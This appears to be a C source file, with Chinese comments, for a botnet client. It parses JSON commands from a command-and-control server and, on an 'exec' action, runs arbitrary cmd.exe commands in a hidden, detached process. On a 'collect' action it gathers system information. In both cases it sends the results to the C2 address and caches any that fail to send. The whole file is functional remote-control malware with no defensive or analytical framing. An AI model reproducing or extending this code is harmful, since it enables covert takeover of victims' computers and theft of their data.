#include "bot.h"

// 获取输出线程参数结构
typedef struct {
    HANDLE hPipe;
    char* output;
    size_t max_size;
    size_t totalBytes;
} ThreadParams;

// 输出读取线程函数
DWORD WINAPI OutputReaderThread(LPVOID lpParam) {
    ThreadParams* params = (ThreadParams*)lpParam;
    char buffer[4096];
    DWORD bytesRead;

    while (1) {
        if (!ReadFile(params->hPipe, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead == 0)
            break;
        
        // 确保缓冲区空间足够
        if (params->totalBytes + bytesRead < params->max_size) {
            memcpy(params->output + params->totalBytes, buffer, bytesRead);
            params->totalBytes += bytesRead;
        } else {
            // 缓冲区已满，只复制剩余空间
            size_t remaining = params->max_size - params->totalBytes - 1;
            if (remaining > 0) {
                memcpy(params->output + params->totalBytes, buffer, remaining);
                params->totalBytes += remaining;
            }
            break;
        }
    }
    
    // 确保字符串正确终止
    if (params->totalBytes < params->max_size) {
        params->output[params->totalBytes] = '\0';
    } else {
        params->output[params->max_size - 1] = '\0';
    }
    
    return 0;
}

char* execute_command(const char *cmd) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hStdoutRd, hStdoutWr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
        #ifdef DEBUG_MODE
        printf("[ERROR] CreatePipe failed: %d\n", GetLastError());
        #endif
        return NULL;
    }
    
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // 确保隐藏窗口
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;
    
    char cmdLine[1024];
    strcpy_s(cmdLine, sizeof(cmdLine), "cmd.exe /c ");
    strcat_s(cmdLine, sizeof(cmdLine), cmd);

    // 创建进程
    if (!CreateProcessA(
            NULL,            // 应用程序名
            cmdLine,         // 命令行
            NULL,            // 进程安全属性
            NULL,            // 线程安全属性
            TRUE,            // 句柄继承
            CREATE_NO_WINDOW | DETACHED_PROCESS,
            NULL,            // 环境变量
            NULL,            // 当前目录
            &si,             // STARTUPINFO
            &pi)) {          // PROCESS_INFORMATION
        
        #ifdef DEBUG_MODE
        printf("[ERROR] CreateProcess failed: %d\n", GetLastError());
        #endif
        
        CloseHandle(hStdoutRd);
        CloseHandle(hStdoutWr);
        return NULL;
    }
    
    // 关键修复1：立即关闭不需要的句柄
    CloseHandle(hStdoutWr);  // 允许管道触发EOF
    CloseHandle(pi.hThread); // 修复句柄泄漏

    // 关键修复2：动态分配线程参数
    ThreadParams* params = (ThreadParams*)malloc(sizeof(ThreadParams));
    if (!params) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed for thread params\n");
        #endif
        CloseHandle(hStdoutRd);
        CloseHandle(pi.hProcess);
        return NULL;
    }

    params->hPipe = hStdoutRd;
    params->output = (char*)malloc(MAX_RESPONSE);
    if (!params->output) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed for command output\n");
        #endif
        free(params);
        CloseHandle(hStdoutRd);
        CloseHandle(pi.hProcess);
        return NULL;
    }
    params->max_size = MAX_RESPONSE;
    params->totalBytes = 0;
    params->output[0] = '\0';

    // 创建读取线程
    HANDLE hThread = CreateThread(
        NULL, 0, OutputReaderThread, params, 0, NULL
    );
    if (!hThread) {
        #ifdef DEBUG_MODE
        printf("[ERROR] CreateThread failed: %d\n", GetLastError());
        #endif
        free(params->output);
        free(params);
        CloseHandle(hStdoutRd);
        CloseHandle(pi.hProcess);
        return NULL;
    }

    // 等待进程结束
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // 获取退出代码
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess); // 关闭进程句柄
    
    #ifdef DEBUG_MODE
    printf("[DEBUG] Command exited with code %d\n", exitCode);
    #endif
    
    // 关键修复3：确保线程完全退出（无限等待）
    WaitForSingleObject(hThread, INFINITE);
    
    // 清理资源
    CloseHandle(hStdoutRd);  // 管道读取端
    CloseHandle(hThread);    // 线程句柄

    // 转移输出结果所有权
    char* result = params->output;
    free(params); // 只释放结构体，不释放output内存
    
    #ifdef DEBUG_MODE
    printf("[DEBUG] Command output size: %d\n", (int)strlen(result));
    #endif
    
    return result;
}

void parse_and_execute_command(const char *response_body) {
    #ifdef DEBUG_MODE
    printf("[DEBUG] Parsing command: %s\n", response_body);
    #endif

    json_error_t error;
    json_t *root = json_loads(response_body, 0, &error);
    
    if (!root) {
        #ifdef DEBUG_MODE
        printf("[ERROR] JSON parse error: %s\n", error.text);
        #endif
        return;
    }
    
    // 检查是否为结果报告
    json_t *type = json_object_get(root, "type");
    if (type && json_is_string(type)) {
        const char *type_str = json_string_value(type);
        if (strcmp(type_str, "result") == 0 || strcmp(type_str, "info") == 0) {
            #ifdef DEBUG_MODE
            printf("[DEBUG] Sending cached result to C2\n");
            #endif
            
            // 发送结果状态
            if (send_data_to_server(C2_IP, C2_PORT, response_body) != 0) {
                #ifdef DEBUG_MODE
                printf("[ERROR] Failed to send result to C2\n");
                #endif
                // 失败时重新缓存
                cache_command(response_body);
            }
            
            json_decref(root);
            return;
        }
    }
    
    // 处理action字段
    json_t *action = json_object_get(root, "action");
    if (action && json_is_string(action)) {
        const char *action_str = json_string_value(action);
        
        if (strcmp(action_str, "exec") == 0) {
            // 执行命令
            json_t *command = json_object_get(root, "command");
            if (command && json_is_string(command)) {
                const char *cmd_str = json_string_value(command);
                #ifdef DEBUG_MODE
                printf("[DEBUG] Executing command: %s\n", cmd_str);
                #endif
                
                char *output = execute_command(cmd_str);
                if (output  && *output != '\0' ) {
                    // 清理输出中的特殊字符
                    char *clean_output = clean_command_output(output);
                    
                    // 构造结果对象
                    json_t *result_obj = json_object();
                    json_object_set_new(result_obj, "type", json_string("result"));
                    json_object_set_new(result_obj, "bot_id", json_string(bot_id));
                    json_object_set_new(result_obj, "result", json_string(clean_output ? clean_output : output));
                    
                    char *result_str = json_dumps(result_obj, JSON_COMPACT);
                    
                    // 直接发送给C2
                    if (send_data_to_server(C2_IP, C2_PORT, result_str) != 0) {
                        #ifdef DEBUG_MODE
                        printf("[ERROR] Failed to send command result to C2, caching instead\n");
                        #endif
                        cache_command(result_str);
                    } else {
                        #ifdef DEBUG_MODE
                        printf("[DEBUG] Command result sent to C2\n");
                        #endif
                    }
                    
                    // 清理资源
                    free(result_str);
                    json_decref(result_obj);
                    free(output);
                    if (clean_output) free(clean_output);
                }
            }
        } else if (strcmp(action_str, "collect") == 0) {
            // 收集系统信息
            char *info = collect_system_info();
            if (info) {
                #ifdef DEBUG_MODE
                printf("[DEBUG] Sending system info\n");
                #endif
                // 构造系统信息对象
                json_t *info_obj = json_object();
                json_object_set_new(info_obj, "type", json_string("info"));
                json_object_set_new(info_obj, "bot_id", json_string(bot_id));
                json_object_set_new(info_obj, "info", json_string(info));
                
                char *info_str = json_dumps(info_obj, JSON_COMPACT);
                
                // 直接发送给C2
                if (send_data_to_server(C2_IP, C2_PORT, info_str) != 0) {
                    #ifdef DEBUG_MODE
                    printf("[ERROR] Failed to send system info to C2, caching instead\n");
                    #endif
                    cache_command(info_str);
                } else {
                    #ifdef DEBUG_MODE
                    printf("[DEBUG] System info sent to C2\n");
                    #endif
                }
                
                // 清理资源
                free(info_str);
                json_decref(info_obj);
                free(info);
            }
        }
    }
    
    // 清理JSON
    json_decref(root);
}


// 新增函数：清理命令输出中的特殊字符
char* clean_command_output(const char* output) {
    if (!output) return NULL;
    
    size_t len = strlen(output);
    char *clean = malloc(len * 3 + 1); // 最坏情况下需要3倍空间
    if (!clean) return NULL;
    
    char *dst = clean;
    for (const char *src = output; *src; src++) {
        if (*src == '"' || *src == '\\') {
            *dst++ = '\\';
            *dst++ = *src;
        } else if (*src < 32 || *src > 126) {
            // 替换非打印字符为空格
            *dst++ = ' ';
        } else {
            *dst++ = *src;
        }
    }
    *dst = '\0';
    
    return clean;
}